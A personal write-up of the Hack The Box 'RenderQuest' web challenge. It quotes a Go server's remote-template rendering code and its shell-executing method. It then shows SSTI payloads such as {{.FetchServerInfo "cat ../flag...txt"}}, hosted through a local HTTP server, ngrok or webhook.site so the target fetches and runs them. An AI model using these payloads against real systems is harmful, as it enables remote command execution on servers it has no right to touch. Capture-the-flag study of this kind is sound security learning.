
2024-10-02 23:16

Source: #web #htb 

Tags: [[Server-side template injection (SSTI)]]
## Reconnaissance

We notice the `go` source code that seems to execute code from remote templates.

```go
	if remote == "true" {
			tmplFile, err = readRemoteFile(page)
	
			if err != nil {
				http.Error(w, "Internal Server Error", http.StatusInternalServerError)
				return
			}
		} else {
165			tmplFile, err = readFile(TEMPLATE_DIR+"/"+page, "./")
	
			if err != nil {
				http.Error(w, "Internal Server Error", http.StatusInternalServerError)
				return
			}
		}
	
180		tmpl, err := template.New("page").Parse(tmplFile)
		if err != nil {
			http.Error(w, "Internal Server Error", http.StatusInternalServerError)
			return
		}
	
		err = tmpl.Execute(w, reqData)
		if err != nil {
			http.Error(w, "Internal Server Error", http.StatusInternalServerError)
			return
		}
```
The function `readRemoteFile` allows the application to fetch a remote resource 
**Notice how this function does not do any sort of sanitization and simply fetches & returns the contents of the remote page**

On **line 180** a new template is generated and displayed using the contents of `tmplFile`, which we control through the `page`query parameter. This essentially exposes the application to **SSTI** because we could host a harmful file for the application to fetch and render.

We also notice that there is a method that executes system commands.

```go
func (p RequestData) FetchServerInfo(command string) string {
	out, err := exec.Command("sh", "-c", command).Output()
	if err != nil {
		return ""
	}
	return string(out)
}
```
## Foothold

We can create a template file that executes commands on the server by using go templating code.

> To identify that the backend is using the Go template engine, you can utilize the following payloads:
> 
> - `{{ . }}`: Represents the data structure passed as input to the template.
>     - If the passed data is an object with an attribute, you can use `{{ .Attribute_name_here }}` to leak it.
> - `{{ printf "%s" "printing text" }}`: you can also call print or other methods.
> 
> [(source)](https://www.onsecurity.io/blog/go-ssti-method-research/)

In this case, we can call the method that allows us to execute commands on the server via `{{.FetchServerInfo "command_here"}}`.

First, we need to create a template file that we will serve by setting up our server.
```shell
$ cat exploit.tpl 
{{.FetchServerInfo "ls -lah"}}
```
We set up server in the directory where the template file is located.
``` shell
$ python3 -m http.server 80
```

And set up `ngrok` for outside access as we are not connected through a vpn.
``` shell
$ ngrok http http://localhost:80
```
get the [[ngork]] URL and append our file name to it and add it in the input field of the website 

## Alternate 

instead of using ngork to create the URL we could also use the website https://webhook.site/#!/
click `Edit` on the right hand side of the top ribbon 
change the content to `{{.FetchServerInfo "cat ../flag154d8430d7.txt"}}` and hit save
click `copy` which to the left of `Edit` and click `URL` 
then add this URL in the victim website 

### References
https://app.hackthebox.com/challenges/RenderQuest

walkthrough - 
https://vulnerable.sh/posts/htb_renderquest/
https://henri-demanou.medium.com/htb-renderquest-3fa19d67f58d
https://medium.com/@tanish.saxena26/hackthebox-renderquest-cf6c493d7b83 - (uses` webhook.site`)
https://exploit-notes.hdks.org/exploit/web/go-ssti/?source=post_page-----3fa19d67f58d--------------------------------